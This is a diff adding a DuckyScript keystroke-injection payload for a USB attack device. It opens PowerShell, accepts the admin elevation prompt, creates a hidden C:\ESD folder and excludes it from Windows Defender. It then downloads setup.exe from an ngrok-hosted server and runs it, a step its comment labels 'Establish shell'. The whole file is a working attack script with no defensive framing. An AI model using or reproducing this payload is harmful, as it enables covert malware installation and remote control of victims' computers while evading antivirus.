@@ -1,0 +1,30 @@
+REM Open powershell
+GUI R
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+STRING Start-Process powershell -Verb RunAs
+DELAY 750
+LEFT
+DELAY 250
+ENTER
+DELAY 1000
+
+REM Establish shell
+STRING New-Item -Path C:\ESD -ItemType Directory; (Get-Item -Path C:\ESD).Attributes += 'Hidden'; Add-MpPreference -ExclusionPath "C:\ESD"
+DELAY 500
+ENTER
+DELAY 500
+STRING $url = "https://106a-129-21-74-210.ngrok-free.app/setup.exe"; $gng = "C:\ESD\setup.exe"; (New-Object Net.WebClient).DownloadFile($url, $gng); Start-Process $gng
+DELAY 500
+ENTER
+DELAY 1000
+STRING exit
+DELAY 250
+ENTER
+DELAY 500s
+STRING exit
+DELAY 250
+ENTER
